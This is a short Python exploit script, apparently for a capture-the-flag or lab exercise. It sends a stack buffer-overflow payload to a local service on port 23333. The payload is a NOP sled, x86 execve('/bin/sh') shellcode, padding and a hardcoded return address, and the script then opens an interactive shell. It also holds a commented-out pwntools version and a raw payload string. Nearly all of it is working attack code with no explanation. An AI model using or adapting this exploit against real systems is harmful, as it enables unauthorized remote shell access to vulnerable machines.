#!/usr/bin/env python

# from pwn import *

# attack = remote('127.0.0.1', 23333)

# retn = 0xbfffee50

# shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
# shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
# shellcode += "\x0b\xcd\x80"

# payload = '\x90' * 4 + shellcode + '\x90' * (136 - len(shellcode)) + p32(retn)

# # print repr(payload)

# attack.send(payload)

# attack.interactive()


import struct
from zio import *

attack = zio(('127.0.0.1', 23333))

retn = 0xbfffee50

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

payload = '\x90' * 4 + shellcode + '\x90' * (136 - len(shellcode)) + l32(retn)

attack.write(payload)

attack.interact()


# \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xec\xff\xbf